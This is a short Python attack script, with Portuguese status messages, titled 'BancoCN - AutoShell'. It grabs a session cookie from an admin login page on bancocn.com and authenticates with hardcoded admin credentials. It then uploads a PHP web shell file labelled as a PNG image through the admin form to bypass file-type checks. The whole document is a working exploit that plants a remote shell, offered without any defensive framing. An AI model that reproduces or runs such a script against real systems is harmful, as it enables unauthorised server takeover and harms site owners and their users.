from requests import post, get
import random, string

cnFile = "autoshell_base.php7"

files = {
    'image': (cnFile, open(cnFile, 'rb'), "image/png"),
}

def randomData(length):
   letters = string.ascii_lowercase
   return ''.join(random.choice(letters) for i in range(length))

LOGIN_PAYLOAD = 'user=admin&password=senhafoda'

print("** BancoCN - AutoShell")
print(" * Resgatando SESSID")

resp3 = get("http://www.bancocn.com/admin/login.php")
COOKIES = resp3.cookies



print(" * Autenticando SESSID")

resp1 = post('http://www.bancocn.com/admin/index.php', data=LOGIN_PAYLOAD, allow_redirects=True, cookies=COOKIES, headers={
   'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
   'Content-Type': 'application/x-www-form-urlencoded'
})


print(" * Fazendo Upload")
resp2 = post('http://www.bancocn.com/admin/index.php', files=files, data={
   'category': 1,
   'Add': 'Add',
   'title': randomData(8)
}, cookies=COOKIES)

print(resp2.text)